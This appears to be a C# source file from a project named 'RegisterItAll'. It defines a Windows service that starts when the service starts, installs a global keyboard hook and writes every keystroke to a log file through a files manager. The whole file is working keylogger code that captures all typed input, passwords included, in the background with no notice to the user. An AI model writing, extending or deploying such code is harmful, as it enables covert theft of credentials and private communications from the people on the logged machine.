using Gma.System.MouseKeyHook;
using RegisterItAll.Managers;
using RegisterItAll.Services.Base;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace RegisterItAll.Services
{
    public partial class KeystrokesCapturerService : ExecutableAsConsoleApplicationService
    {
        protected override void OnStart(string[] args)
        {
            // This call is not awaited because it blocks the execution of the other services.
            RegisterKeyLogging();
        }

        private static async Task RegisterKeyLogging()
        {
            await Task.Delay(1);

            IKeyboardMouseEvents hook = Hook.GlobalEvents();

            hook.KeyPress += OnKeyPressed;

            Application.Run();
        }

        private static void OnKeyPressed(object sender, KeyPressEventArgs args)
        {
            FilesManager.SaveLog(args.KeyChar.ToString());
        }
    }
}